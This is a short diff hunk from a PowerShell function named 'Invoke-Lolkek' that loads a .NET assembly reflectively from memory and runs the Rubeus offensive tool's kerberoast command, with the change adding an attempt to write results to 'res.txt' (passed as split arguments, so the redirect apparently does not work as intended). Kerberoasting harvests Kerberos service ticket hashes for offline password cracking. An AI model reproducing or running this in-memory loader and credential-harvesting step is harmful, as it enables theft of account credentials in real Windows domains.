@@ -6,6 +6,6 @@ function Invoke-Lolkek
 	$b.CopyTo($c)
 	[byte[]]$d = $c.ToArray()
 	$e = [System.Reflection.Assembly]::Load($d)
-	[Rubeus.Program]::Main("kerberoast /nowrap".Split())
+	[Rubeus.Program]::Main("kerberoast /nowrap > res.txt".Split())
 	
 }
